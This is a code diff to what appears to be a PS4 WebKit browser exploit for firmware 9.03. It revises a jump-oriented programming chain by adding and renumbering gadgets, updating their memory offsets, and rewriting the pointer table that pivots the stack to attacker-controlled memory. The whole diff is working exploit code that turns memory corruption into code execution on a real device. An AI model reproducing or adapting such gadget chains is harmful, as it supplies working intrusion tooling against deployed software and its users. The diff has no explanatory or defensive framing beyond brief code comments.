@@ -83,7 +83,7 @@ let libc_base = null;
 const jop1 = `
 mov rdi, qword ptr [rsi + 0x20]
 mov rax, qword ptr [rdi]
-call qword ptr [rax + 0x28]
+call qword ptr [rax + 0xb8]
 `;
 // Since the method of code redirection we used is via redirecting a call to
 // jump to our JOP chain, we have the return address of the caller on entry.
@@ -100,21 +100,26 @@ jmp qword ptr [rax + 0x1c]
 // rbp is now pushed, any extra objects pushed by the call instructions can be
 // ignored
 const jop3 = `
+mov rdi, qword ptr [rax + 8]
+mov rax, qword ptr [rdi]
+jmp qword ptr [rax + 0x30]
+`;
+const jop4 = `
 push rbp
 mov rbp, rsp
 mov rax, qword ptr [rdi]
 call qword ptr [rax + 0x58]
 `;
-const jop4 = `
+const jop5 = `
 mov rdx, qword ptr [rax + 0x18]
 mov rax, qword ptr [rdi]
 call qword ptr [rax + 0x10]
 `;
-const jop5 = `
+const jop6 = `
 push rdx
 jmp qword ptr [rax]
 `;
-const jop6 = 'pop rsp; ret';
+const jop7 = 'pop rsp; ret';
 
 // the ps4 firmware is compiled to use rbp as a frame pointer
 //
@@ -174,10 +179,11 @@ const webkit_gadget_offsets = new Map(Object.entries({
 
     [jop1] : 0x00000000004e62a4,//0x0000000000f2c778,
     [jop2] : 0x00000000021fce7e,
-    [jop3] : 0x0000000000683800,
-    [jop4] : 0x0000000000303906,
-    [jop5] : 0x00000000028bd332,
-    [jop6] : 0x000000000004e293,
+    [jop3] : 0x00000000019becb4,
+    [jop4] : 0x0000000000683800,
+    [jop5] : 0x0000000000303906,
+    [jop6] : 0x00000000028bd332,
+    [jop7] : 0x000000000004e293,
 }));
 
 const libc_gadget_offsets = new Map(Object.entries({
@@ -528,11 +534,12 @@ class Chain903 extends Chain903Base {
         const rax_ptrs_p = get_view_vector(rax_ptrs);
         this.rax_ptrs = rax_ptrs;
 
-        rw.write64(rax_ptrs, 0x28, this.get_gadget(jop2));
+        rw.write64(rax_ptrs, 0xb8, this.get_gadget(jop2));
         rw.write64(rax_ptrs, 0x1c, this.get_gadget(jop3));
-        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop4));
-        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop5));
-        rw.write64(rax_ptrs, 0, this.get_gadget(jop6));
+        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop4));
+        rw.write64(rax_ptrs, 0x58, this.get_gadget(jop5));
+        rw.write64(rax_ptrs, 0x10, this.get_gadget(jop6));
+        rw.write64(rax_ptrs, 0, this.get_gadget(jop7));
         // value to pivot rsp to
         rw.write64(rax_ptrs, 0x18, this.stack_addr);
 
